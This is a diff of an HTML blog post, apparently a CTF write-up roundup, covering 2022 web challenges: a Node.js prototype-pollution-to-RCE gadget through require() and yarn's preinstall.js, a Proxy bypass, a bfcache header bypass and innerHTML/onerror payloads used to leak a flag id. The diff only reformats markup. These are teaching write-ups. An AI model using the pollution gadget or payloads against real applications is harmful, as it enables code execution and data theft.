@@ -244,8 +244,8 @@
 <li>Reading data from shadow DOM (HITCON CTF 2022)</li>
 </ol>
 <span id="more"></span>
-<h2><span id="balsn-ctf-2022-2linenodejs">Balsn CTF 2022 - 2linenodejs</span></h2>
-<p>The code is very simple:</p>
+
+<h2><span id="balsn-ctf-2022-2linenodejs">Balsn CTF 2022 - 2linenodejs</span></h2><p>The code is very simple:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token hashbang comment">#!/usr/local/bin/node</span>
 process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'readable'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
@@ -269,15 +269,18 @@ module<span class="token punctuation">.</span><span class="token function-variab
         <span class="token punctuation">)</span>
     <span class="token punctuation">)</span><span class="token punctuation">,</span> o
 <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>There is an obvious prototype pollution vulnerability, so the challenge is about how to achieve RCE after having prototype pollution in node.js.</p>
-<p>Another key point is the <code>require('./usage')</code> inside the catch.</p>
+<p>Another key point is the <code>require(&#39;./usage&#39;)</code> inside the catch.</p>
 <p>The last key point is this paper: <a target="_blank" rel="noopener" href="https://arxiv.org/abs/2207.11171">Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js</a>, which mentions many cases of RCE from prototype pollution and provides gadgets or some hints.</p>
 <p>However, one of the vulnerabilities in the paper has been fixed in the version used in this challenge: <a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L484">https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L484</a></p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">:</span> expansion <span class="token operator">=</span> <span class="token string">''</span> <span class="token punctuation">&#125;</span> <span class="token operator">=</span>
     <span class="token function">RegExpPrototypeExec</span><span class="token punctuation">(</span><span class="token constant">EXPORTS_PATTERN</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span> <span class="token operator">||</span> kEmptyObject<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>kEmptyObject is <code>ObjectFreeze(ObjectCreate(null))</code>, so it cannot be polluted.</p>
 <p>But anyway, if you continue to look for it in the file, you will find that the <code>trySelf</code> function has the same problem here: <a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454">https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454</a></p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">data</span><span class="token operator">:</span> pkg<span class="token punctuation">,</span> <span class="token literal-property property">path</span><span class="token operator">:</span> pkgPath <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">readPackageScope</span><span class="token punctuation">(</span>parentPath<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>The default value here also uses <code>&#123;&#125;</code>, so it can be interfered with through prototype pollution.</p>
 <p>The following code will load <code>./pwn.js</code> instead of <code>./usage.js</code>:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
@@ -289,6 +292,7 @@ module<span class="token punctuation">.</span><span class="token function-variab
 <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'./'</span>
 
 <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage.js'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>Therefore, through prototype pollution, any file can be required. The next task is to find a built-in file with a usable payload. My teammate found <code>/opt/yarn-v1.22.19/preinstall.js</code>, and the final payload looks like this:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
   <span class="token literal-property property">exports</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
@@ -305,21 +309,21 @@ module<span class="token punctuation">.</span><span class="token function-variab
 <span class="token punctuation">&#125;</span>
 
 <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage.js'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>Writeups by others:</p>
 <ol>
 <li><a target="_blank" rel="noopener" href="https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs">https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs</a></li>
 </ol>
-<h3><span id="corctf-2022-sbxcalc">corCTF 2022 - sbxcalc</span></h3>
-<p>The core part of this challenge can be seen as follows:</p>
+<h3><span id="corctf-2022-sbxcalc">corCTF 2022 - sbxcalc</span></h3><p>The core part of this challenge can be seen as follows:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">flag</span><span class="token operator">:</span> window<span class="token punctuation">.</span>flag <span class="token operator">||</span> <span class="token string">'flag'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
   <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token string">'nope'</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>How can you get the flag blocked by the proxy?</p>
 <p>The answer is <code>Object.getOwnPropertyDescriptor</code>.</p>
-<p><code>Object.getOwnPropertyDescriptor(p, 'flag')</code> can be used to obtain the original value instead of the value processed by the proxy.</p>
+<p><code>Object.getOwnPropertyDescriptor(p, &#39;flag&#39;)</code> can be used to obtain the original value instead of the value processed by the proxy.</p>
 <p>Author’s writeup: <a target="_blank" rel="noopener" href="https://brycec.me/posts/corctf_2022_challenges#sbxcalc">https://brycec.me/posts/corctf_2022_challenges#sbxcalc</a></p>
-<h3><span id="seccon-ctf-2022-quals-spanote">SECCON CTF 2022 Quals - spanote</span></h3>
-<p>There is a cache in Chrome called back/forward cache, abbreviated as bfcache, which I heard for the first time: <a target="_blank" rel="noopener" href="http://web.dev/articles/bfcache">http://web.dev/articles/bfcache</a></p>
+<h3><span id="seccon-ctf-2022-quals-spanote">SECCON CTF 2022 Quals - spanote</span></h3><p>There is a cache in Chrome called back&#x2F;forward cache, abbreviated as bfcache, which I heard for the first time: <a target="_blank" rel="noopener" href="http://web.dev/articles/bfcache">http://web.dev/articles/bfcache</a></p>
 <p>The second disk cache should be more familiar to everyone, and fetched resources will be stored in it.</p>
 <p>Using this bfcache, interesting behaviors can be achieved.</p>
 <p>Now there is an API like this:</p>
@@ -331,6 +335,7 @@ module<span class="token punctuation">.</span><span class="token function-variab
   <span class="token keyword">const</span> noteId <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>params<span class="token punctuation">.</span>noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">sendNote</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>Although it is a GET, it will check the custom header, so it cannot be accessed directly by the browser.</p>
 <p>But with the cache behavior just mentioned, you can:</p>
 <ol>
@@ -340,26 +345,28 @@ module<span class="token punctuation">.</span><span class="token function-variab
 </ol>
 <p>You can use the browser to directly browse the cached response and bypass the restriction of the custom header.</p>
 <p>For a more detailed writeup of the entire question, please see here: <a target="_blank" rel="noopener" href="https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote">https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote</a></p>
-<h3><span id="hitcon-ctf-2022">HITCON CTF 2022</span></h3>
-<p>First, let’s post the writeups for maple and splitline:</p>
+<h3><span id="hitcon-ctf-2022">HITCON CTF 2022</span></h3><p>First, let’s post the writeups for maple and splitline:</p>
 <ol>
-<li><a target="_blank" rel="noopener" href="https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022">https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON CTF 2022</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022">https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022</a></li>
 <li><a target="_blank" rel="noopener" href="https://blog.splitline.tw/hitcon-ctf-2022/">https://blog.splitline.tw/hitcon-ctf-2022/</a></li>
 </ol>
 <p>This time I only looked at Self Destruct Message, and briefly talked about several points.</p>
 <p>The first is when executing <code>element.innerHTML = str</code>, usually anything in HTML will be executed asynchronously, for example:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">element<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;img src=x onerror=console.log(1)>'</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>It is definitely logging 2 first and then 1.</p>
 <p>But if you write it like this:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span>
 div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;svg>&lt;svg onload=console.log(1)>'</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>It will magically become 1 in front, and this div will even work without being placed in the DOM. The relevant discussion can be seen in this thread: <a target="_blank" rel="noopener" href="https://twitter.com/terjanq/status/1421093136022048775">https://twitter.com/terjanq/status/1421093136022048775</a></p>
 <p>Next is to use the error stack to find the original location and get the flag id:</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'unhandledrejection'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
 	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">.</span>stack<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\/message\/(\w+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>And this question also has other solutions. Although the element is placed in the shadow DOM, the flag can be stolen through some xsleak. The more complete research is here: <a target="_blank" rel="noopener" href="https://blog.ankursundara.com/shadow-dom/">The Closed Shadow DOM</a></p>
 <p>Similar questions have appeared in DiceCTF 2022, and I have written a post about my experience, but I didn’t start tagging keywords at that time: <a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/</a></p>
 
